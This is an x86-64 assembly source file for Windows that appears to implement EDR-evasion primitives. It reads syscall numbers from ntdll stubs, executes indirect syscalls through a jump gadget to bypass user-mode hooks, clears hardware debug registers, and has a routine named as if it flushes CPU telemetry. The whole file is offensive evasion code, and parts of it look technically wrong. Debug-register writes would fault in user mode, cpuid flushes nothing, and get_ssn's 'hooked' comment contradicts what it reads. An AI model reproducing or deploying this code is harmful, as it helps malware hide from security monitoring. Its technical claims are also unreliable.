.section .text
.globl execute_syscall
.globl _execute_syscall
.globl get_ssn

# int get_ssn(void* addr)
# Extracts the SSN from the hooked ntdll function bytes
get_ssn:
    movl 4(%rcx), %eax
    ret

# NTSTATUS execute_syscall(uint32_t ssn, uintptr_t gadget, PVOID a1, PVOID a2, PVOID a3, PVOID a4, PVOID a5, PVOID a6, PVOID a7, PVOID a8, PVOID a9, PVOID a10, PVOID a11)
execute_syscall:
_execute_syscall:
    movq %rcx, %rax        # ssn
    movq %rdx, %r11        # gadget address

    # Params 1-4 go to registers (kernel expects them in R10,RDX,R8,R9 after sycall)
    movq %r8, %r10         # a1 → R10 (1st syscall param)
    movq %r9, %rdx         # a2 → RDX (2nd syscall param)

    # a3/a4 from stack → R8/R9 (3rd/4th syscall param)
    movq 40(%rsp), %r8     # a3
    movq 48(%rsp), %r9     # a4

    # Kernel reads 5th+ params from [RSP+40] onwards (skip ret addr + shadow).
    # a5..a11 start at [RSP+56], shift them UP 16 bytes into a3/a4's old slots.
    movq 56(%rsp), %rcx    # a5 → [RSP+40]  (5th kernel param)
    movq %rcx, 40(%rsp)
    movq 64(%rsp), %rcx    # a6 → [RSP+48]  (6th)
    movq %rcx, 48(%rsp)
    movq 72(%rsp), %rcx    # a7 → [RSP+56]  (7th)
    movq %rcx, 56(%rsp)
    movq 80(%rsp), %rcx    # a8 → [RSP+64]  (8th)
    movq %rcx, 64(%rsp)
    movq 88(%rsp), %rcx    # a9 → [RSP+72]  (9th)
    movq %rcx, 72(%rsp)
    movq 96(%rsp), %rcx    # a10 → [RSP+80] (10th)
    movq %rcx, 80(%rsp)
    movq 104(%rsp), %rcx   # a11 → [RSP+88] (11th)
    movq %rcx, 88(%rsp)

    jmp *%r11

.globl clear_hw_breakpoints
clear_hw_breakpoints:
    xor %rax, %rax
    mov %rax, %dr0
    mov %rax, %dr1
    mov %rax, %dr2
    mov %rax, %dr3
    mov $1, %rax
    ret

.globl flush_cpu_telemetry
flush_cpu_telemetry:
    xor %rax, %rax
    cpuid
    ret
